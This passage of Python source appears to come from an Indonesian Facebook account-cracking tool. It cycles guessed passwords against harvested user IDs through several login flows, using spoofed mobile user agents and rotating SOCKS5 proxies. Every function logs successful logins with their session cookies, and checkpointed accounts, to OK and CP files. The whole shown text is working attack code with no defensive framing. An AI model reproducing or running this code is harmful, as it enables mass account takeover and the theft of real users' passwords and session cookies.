253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login.php?skip_api_login=1&api_key=1722713787887984&kid_directed_site=0&app_id=1722713787887984&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.Kues.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,Kues={'Kue': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='ARIP-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ METHOD REGULER ]--------------------#
def reguler1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Reguler V1[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def reguler2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Reguler V2[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			link = random.choice(["https://m.facebook.com/login/device-based/regular/login/?api_key=140810032656374&auth_token=63ed3e768f0e783f4cc81a6b1026c500&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&refsrc=deprecated&app_id=140810032656374&cancel=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=7ade521eceaab1458866d9821149d64f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1677182177996%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11da1fc663793c%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df2bda15588a0498%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1931b4149a3a44%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%2526frame%253Df3f39a10ef963dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9"])
			po = ses.post(link,data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def reguler3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Reguler V3[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'free.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://free.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://free.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ METODE ASYNC ]--------------------#
def kontol(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Async[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
